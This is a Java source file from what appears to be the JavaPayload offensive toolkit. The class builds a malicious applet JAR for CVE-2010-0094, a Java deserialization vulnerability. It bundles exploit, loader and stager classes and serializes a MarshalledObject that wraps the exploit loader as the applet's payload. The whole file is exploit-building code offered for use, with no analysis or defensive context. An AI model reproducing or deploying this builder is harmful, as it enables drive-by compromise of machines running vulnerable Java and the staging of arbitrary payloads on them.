package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.MarshalledObject;
import java.util.jar.Manifest;

public class CVE_2010_0094_AppletJarBuilder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.CVE_2010_0094_AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
			return;
		}
		final Class[] baseClasses = new Class[] {
				javapayload.exploit.CVE_2010_0094.class,
				javapayload.exploit.DeserializationExploit.class,
				javapayload.exploit.DeserializationExploit.Loader.class,
				javapayload.loader.AppletLoader.class,
				javapayload.loader.AppletLoader.ReadyNotifier.class,
				javapayload.stager.Stager.class,
		};
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(new MarshalledObject(new javapayload.exploit.DeserializationExploit.Loader()));
		oos.close();		
		JarBuilder.buildJarFromArgs(args, "CVE_2010_0094_Applet", baseClasses, new Manifest(), "x", baos.toByteArray());
	}
}
